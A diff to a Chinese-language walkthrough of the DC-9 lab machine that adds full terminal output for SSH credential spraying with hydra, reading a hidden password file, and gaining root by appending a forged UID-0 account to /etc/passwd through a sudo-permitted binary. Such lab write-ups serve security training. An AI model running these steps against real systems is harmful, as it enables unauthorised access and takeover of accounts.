@@ -350,10 +350,22 @@ Nmap done: 1 IP address (1 host up) scanned in 0.91 seconds
 
 *   **SSH 憑證噴灑**：
     將上述帳號與密碼分別存入 `usernames.txt` 與 `passwords.txt`，使用 `hydra` 進行 SSH 憑證噴灑：
-    ```bash
-    ┌──(kali㉿kali)-[~/vulnhub/DC-9]
-    └─$ hydra -L usernames.txt -P passwords.txt ssh://192.168.180.209 -t 4
-    ```
+	```bash
+	┌──(kali㉿kali)-[~/Desktop/playground/DC-9]
+	└─$ hydra -L usernames.txt -P passwords.txt ssh://192.168.204.209     
+	Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+	
+	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-09 21:57:36
+	[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+	[DATA] max 16 tasks per 1 server, overall 16 tasks, 289 login tries (l:17/p:17), ~19 tries per task
+	[DATA] attacking ssh://192.168.204.209:22/
+	[22][ssh] host: 192.168.204.209   login: chandlerb   password: UrAG0D!
+	[22][ssh] host: 192.168.204.209   login: joeyt   password: Passw0rd
+	[STATUS] 276.00 tries/min, 276 tries in 00:01h, 14 to do in 00:01h, 15 active
+	[22][ssh] host: 192.168.204.209   login: janitor   password: Ilovepeepee
+	1 of 1 target successfully completed, 3 valid passwords found
+	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-09 21:58:43
+	```
     **成功噴灑出三個有效帳號：**
     - `janitor:Ilovepeepee`
     - `joeyt:Passw0rd`
@@ -368,7 +380,35 @@ Nmap done: 1 IP address (1 host up) scanned in 0.91 seconds
 #### 3. 橫向移動 (janitor -> fredf)
 登入 `janitor` 後，在其家目錄下的隱藏資料夾中發現了另一個密碼檔：
 ```bash
-janitor@dc-9:~$ cat /home/janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt
+┌──(kali㉿kali)-[~/Desktop/playground/DC-9]
+└─$ ssh janitor@192.168.204.209  
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+janitor@192.168.204.209's password: 
+Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jul 10 12:02:41 2026 from 192.168.45.231
+janitor@dc-9:~$ ls -al
+total 16
+drwx------  4 janitor janitor 4096 Jul 10 11:58 .
+drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..
+lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -> /dev/null
+drwx------  3 janitor janitor 4096 Jul 10 11:58 .gnupg
+drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin
+janitor@dc-9:~$ cd .secrets-for-putin/
+janitor@dc-9:~/.secrets-for-putin$ ls -al
+total 12
+drwx------ 2 janitor janitor 4096 Dec 29  2019 .
+drwx------ 4 janitor janitor 4096 Jul 10 11:58 ..
+-rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txt
+janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
 BamBam01
 Passw0rd
 smellycats
@@ -379,15 +419,29 @@ B4-Tru3-001
 將這批新密碼加入 `passwords.txt` 字典檔中，再次使用 `hydra` 對 SSH 進行噴灑：
 ```bash
 ┌──(kali㉿kali)-[~/vulnhub/DC-9]
-└─$ hydra -L usernames.txt -P passwords.txt ssh://192.168.180.209 -t 4
+└─$ hydra -L usernames.txt -P passwords.txt ssh://192.168.180.209
 ```
 **取得另一位使用者的憑證：**
 - `fredf:B4-Tru3-001`
 
-使用 SSH 登入為 `fredf` 使用者：
+使用 SSH 登入為 `fredf` 使用者，並找到 `local.txt`：
 ```bash
-┌──(kali㉿kali)-[~/vulnhub/DC-9]
-└─$ ssh fredf@192.168.180.209
+┌──(kali㉿kali)-[~/Desktop/playground/DC-9]
+└─$ ssh fredf@192.168.204.209  
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+fredf@192.168.204.209's password: 
+Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+fredf@dc-9:~$ find / -type f -name local.txt 2>/dev/null
+/home/fredf/local.txt
 ```
 
 ---
@@ -405,6 +459,10 @@ User fredf may run the following commands on dc-9:
     (root) NOPASSWD: /opt/devstuff/dist/test/test
 ```
 *   `fredf` 可免密碼以 root 權限執行 `/opt/devstuff/dist/test/test`。
+	```bash
+	fredf@dc-9:/opt/devstuff$ sudo /opt/devstuff/dist/test/test
+	Usage: python test.py read append
+	```
 *   審查該路徑下的程式，發現該二進制程式是由 `/opt/devstuff/test.py` Python 腳本編譯而成。
 *   此程式接收兩個參數：`[read_file_path] [append_file_path]`。功能為將前者的內容追加寫入至後者。
 *   因為是以 root 權限執行此檔案，我們可以利用這個追加寫入的功能，將自定義的特權使用者資訊追加到系統的 `/etc/passwd` 中。
@@ -416,14 +474,15 @@ User fredf may run the following commands on dc-9:
 #### 1. 生成偽造的 root 使用者密碼 Hash
 在攻擊機或靶機本地生成一個 MD5-crypt 加密密碼 Hash（此處設密碼為 `password`）：
 ```bash
-fredf@dc-9:~$ openssl passwd -1 password
-$1$J173o49o$0iIPz1r.UDdFjctdgrwIq0
+┌──(kali㉿kali)-[~/Desktop/playground/DC-9]
+└─$ openssl passwd -1 password
+$1$EeCpViL3$/hKQoVaQ4sDBhMpl406WA.
 ```
 
 #### 2. 建立偽造的使用者紀錄
 建立臨時檔案 `/tmp/add-me`，寫入自訂的特權帳號 `pwned`，將 UID/GID 設為 0，家目錄設為 `/root`，Shell 為 `/bin/bash`：
 ```bash
-fredf@dc-9:~$ echo 'pwned:$1$J173o49o$0iIPz1r.UDdFjctdgrwIq0:0:0:root:/root:/bin/bash' > /tmp/add-me
+fredf@dc-9:/opt/devstuff$ echo 'pwned:$1$EeCpViL3$/hKQoVaQ4sDBhMpl406WA.:0:0:root:/root:/bin/bash' > /tmp/add-me
 ```
 
 #### 3. 追加寫入至 /etc/passwd
@@ -435,12 +494,10 @@ fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test /tmp/add-me /etc/passwd
 #### 4. 切換帳號取得 Root
 使用 `su pwned`，並輸入密碼 `password`，成功取得最高權限：
 ```bash
-fredf@dc-9:~$ su pwned
+fredf@dc-9:/opt/devstuff$ su pwned
 Password: 
-root@dc-9:/home/fredf# id
-uid=0(root) gid=0(root) groups=0(root)
-root@dc-9:/home/fredf# cd /root
-root@dc-9:~# cat theflag.txt
+root@dc-9:/opt/devstuff# find / -type f -name proof.txt 2>/dev/null
+/root/proof.txt
 ```
 成功取得 Flag，滲透測試完成。
 
